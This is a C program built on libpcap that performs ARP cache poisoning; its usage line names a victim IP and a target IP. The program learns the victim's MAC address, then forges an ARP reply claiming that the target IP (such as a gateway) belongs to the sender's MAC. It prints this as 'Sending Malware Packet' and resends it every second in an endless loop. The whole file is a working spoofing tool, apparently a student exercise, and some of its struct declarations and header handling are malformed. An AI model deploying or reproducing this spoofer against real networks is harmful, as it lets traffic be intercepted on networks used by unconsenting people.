#include <pcap.h>
#include <stdio.h>
#include <stdint.h>
#include <stdio.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>


struct arp_packet
{
    struct ethernet_header;
    struct arp_header;
};

struct ethernet_header
{
    u_int8_t ether_dmac[6];
    u_int8_t ether_smac[6];
    u_int16_t ether_type;

};
struct arp_header
{
    u_int16_t hard_type;
    u_int16_t protocol;
    u_int8_t h_size; //hardware size
    u_int8_t p_size; //protocol size
    u_int16_t opcode;
    u_int8_t sender_MAC[6];
    u_int8_t sender_IP[4];
    u_int8_t target_MAC[6];
    u_int8_t target_IP[4];
};

struct sender_ip{
u_int8_t ip[4];
};
struct target_ip{
u_int8_t ip[4];
};

u_int16_t my_ntohs(uint16_t n){
   return n>>8 | n<<8;
}

void print_sender_info(const unsigned char *data){

}


void usage() {
  printf("syntax: sende_arp <interface> <victim_ip> <target_ip>\n");
  printf("sample: sende_arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
    usage();
    return -1;
    }
    int sock = socket(PF_INET, SOCK_DGRAM, 0);


    struct ifreq req;
    int j = 0;

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];

    char* sender = argv[2];
    int k=1;
    char *setemp;
    char *se[4];
    int se_int[4];
    setemp = strtok(sender, ".");
    se[0]=setemp;

    while (setemp != NULL) {
    setemp = strtok(NULL, ".");
    se[k]=setemp;
    k++;
    }

    for (int i=0; i<=3; i++){
      se_int[i]=atoi(se[i]);
    }


    char *ditemp;
    char *di[4];
    int di_int[4];

    char* target = argv[3];
    ditemp = strtok(target, ".");
    di[0]=ditemp;
    k=1;
    while (ditemp != NULL) {
    ditemp = strtok(NULL, ".");
    di[k]=ditemp;
    k++;
    }

    for (int i=0; i<=3; i++){
      di_int[i]=atoi(di[i]);
    }

    uint8_t broadcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
    uint8_t target_mac[6] = {0x00,0x00,0x00,0x00,0x00,0x00};
    // My Mac //
    if (sock < 0) {
             perror("socket");
             exit(EXIT_FAILURE);
     }

     memset(&req, 0, sizeof(req));
     strncpy(req.ifr_name, dev, IF_NAMESIZE - 1);

     if (ioctl(sock, SIOCGIFHWADDR, &req) < 0) {
             perror("ioctl");
             exit(EXIT_FAILURE);
     }

     u_int8_t my_mac[6];
     for(j=0;j<=5;j++) {
             my_mac[j]=(unsigned char) req.ifr_hwaddr.sa_data[j];
     }
    // My Mac End //
     pcap_if_t *alldevs;
     pcap_if_t *d;
     struct pcap_addr *a;
     int i = 0;
     int no;
     char *myip;

     if (pcap_findalldevs(&alldevs, errbuf) < 0) {
         printf("pcap_findalldevs error\n");
         return 1;
     }
     for(pcap_if_t *d=alldevs; d!=NULL; d=d->next) {
         if(!strcmp(dev,d->name))
         {
             for(pcap_addr_t *a=d->addresses; a!=NULL; a=a->next) {
                         if(a->addr->sa_family == AF_INET)
                             myip=inet_ntoa(((struct sockaddr_in*)a->addr)->sin_addr);

             }
     }
     }
     pcap_freealldevs(alldevs);

     // My IP to int //
     char *sitemp;
     char *si[4];
     int si_int[4];

     k=1;

     sitemp = strtok(myip, ".");
     si[0]=sitemp;
     while (sitemp != NULL) {
     sitemp = strtok(NULL, ".");
     si[k]=sitemp;
     k++;

     }

     for (int i=0; i<=3; i++){
       si_int[i]=atoi(si[i]);
     }

    //My ip End//


    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
    }

    u_char packet[42];

    // Custom Packet Start //

    for(int k=0;k<=5;k++){
    packet[k]=broadcast[k];
    packet[k+6]=my_mac[k];
    }

    //ether type//
    packet[12]=0x08;
    packet[13]=0x06;

    //hardware type//
    packet[14]=0x00;
    packet[15]=0x01;

    //Protocol type//
    packet[16]=0x08;
    packet[17]=0x00;

    //Hardware Size//
    packet[18]=0x06;
    //IP Size//
    packet[19]=0x04;

    //opcode//
    packet[20]=0x00;
    packet[21]=0x01;
    for(int k=0;k<=5;k++){
       packet[k+22]=my_mac[k];
       packet[k+32]=target_mac[k];
    }
    for(int k=0;k<=3;k++){
       packet[k+28]=si_int[k];
       packet[k+38]=se_int[k];
    }
    // Custom Packet End //

  const unsigned char *pack = packet;



  printf("============Sending Nomal Packet============\n");
  pcap_sendpacket(handle,pack,42);

     struct pcap_pkthdr* header;
     const u_char* data;

     int res = pcap_next_ex(handle, &header, &data);

     struct ethernet_header *eth;
     eth= (struct ethernet_header *)data;
     u_int16_t ether_type;
     ether_type=my_ntohs(eth->ether_type);
     if(ether_type == 0x0806){
         data=data+sizeof (ethernet_header);
         struct arp_header *arp;
         arp= (struct arp_header *)data;
         printf("\n============Recive Data============\n");
         printf("\nSender IP:");
         for(int i=0; i<=3; i++){

         printf("%u",arp->sender_IP[i]);
         if(i!=3)
               {
                   printf(".");
               }
         }

         printf("\nSender Mac:");
         for(int i=0; i<=5; i++){

         printf("%02X",arp->sender_MAC[i]);
         if(i!=5)
                 {
                     printf(":");
                 }
         }

         printf("\nTarget IP:");
         for(int i=0; i<=3; i++){

         printf("%u",arp->target_IP[i]);
         if(i!=3)
               {
                   printf(".");
               }
         }

         printf("\nTarget Mac:");
         for(int i=0; i<=5; i++){

         printf("%02X",arp->target_MAC[i]);
         if(i!=5)
                 {
                     printf(":");
                 }
         }
         printf("\n");
         // Custom Packet Start //

         for(int k=0;k<=5;k++){
         packet[k]=arp->sender_MAC[k];
         packet[k+6]=my_mac[k];
         }
         //ether type//
         packet[12]=0x08;
         packet[13]=0x06;

         //hardware type//
         packet[14]=0x00;
         packet[15]=0x01;

         //Protocol type//
         packet[16]=0x08;
         packet[17]=0x00;

         //Hardware Size//
         packet[18]=0x06;
         //IP Size//
         packet[19]=0x04;

         //opcode - reply//
         packet[20]=0x00;
         packet[21]=0x02;

         for(int k=0;k<=5;k++){
            packet[k+22]=my_mac[k];
            packet[k+32]=arp->sender_MAC[k];
         }
         for(int k=0;k<=3;k++){
            packet[k+28]=di_int[k];
            packet[k+38]=se_int[k];
         }

         // Custom Packet End //

         printf("============Sending Malware Packet============\n");
         printf("\nSender IP:");
         for(int i=0; i<=3; i++){

         printf("%u",packet[i+28]);
         if(i!=3)
               {
                   printf(".");
               }
         }

         printf("\nSender Mac:");
         for(int i=0; i<=5; i++){

         printf("%02X",packet[i+22]);
         if(i!=5)
                 {
                     printf(":");
                 }
         }

         printf("\nTarget IP:");
         for(int i=0; i<=3; i++){

         printf("%u",packet[i+38]);
         if(i!=3)
               {
                   printf(".");
               }
         }

         printf("\nTarget Mac:");
         for(int i=0; i<=5; i++){

         printf("%02X",packet[i+32]);
         if(i!=5)
                 {
                     printf(":");
                 }
         }
         printf("\n");
         while(1){
         pcap_sendpacket(handle,pack,42);

         sleep(1);
     }
}

  pcap_close(handle);
  return 0;

}
